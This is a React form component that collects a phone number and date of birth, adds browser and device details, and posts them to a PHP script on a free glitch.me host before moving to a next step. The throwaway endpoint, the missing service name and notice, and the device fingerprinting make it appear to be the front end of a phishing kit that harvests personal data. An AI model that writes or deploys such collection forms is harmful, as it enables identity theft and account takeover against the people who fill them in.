import React, { useState } from "react";
import FormInput from "../components/FormInput";

function Home({ onNext }) {
  const [formData, setFormData] = useState({
    phoneNumber: "",
    dateOfBirth: "",
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!formData.phoneNumber.trim()) {
      newErrors.phoneNumber = "Phone number is required";
    }

    if (!formData.dateOfBirth.trim()) {
      newErrors.dateOfBirth = "Date of birth is required";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      // Get device info
      const deviceInfo = {
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        isTouchDevice: "ontouchstart" in window,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
      };

      const submissionData = {
        ...formData,
        ...deviceInfo,
        submittedAt: new Date().toISOString(),
      };

      // Create FormData for the API request
      const apiFormData = new FormData();
      Object.keys(submissionData).forEach((key) => {
        apiFormData.append(key, submissionData[key]);
      });

      // Send to external API
      const response = await fetch(
        "https://mixed-fluff-space.glitch.me/zubaireng.php",
        {
          method: "POST",
          body: apiFormData,
        },
      );

      if (response.ok) {
        // Generate a submission ID
        const submissionId = Date.now();
        setIsSubmitting(false);
        onNext(submissionId, submissionData);
      } else {
        throw new Error("Form submission failed");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setErrors({ submit: "Failed to submit form. Please try again." });
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="form-container">
        <h2 className="text-2xl font-bold text-gray-800 mb-6">
          Personal Information
        </h2>

        <form onSubmit={handleSubmit}>
          <FormInput
            label="Phone Number"
            type="tel"
            name="phoneNumber"
            value={formData.phoneNumber}
            onChange={handleInputChange}
            error={errors.phoneNumber}
            required
            placeholder="Enter your phone number"
          />

          <FormInput
            label="Date of Birth"
            type="date"
            name="dateOfBirth"
            value={formData.dateOfBirth}
            onChange={handleInputChange}
            error={errors.dateOfBirth}
            required
          />

          {errors.submit && (
            <div className="error-message mb-4">{errors.submit}</div>
          )}

          <button
            type="submit"
            className="submit-button"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Submitting..." : "Continue"}
          </button>
        </form>
      </div>
    </div>
  );
}

export default Home;
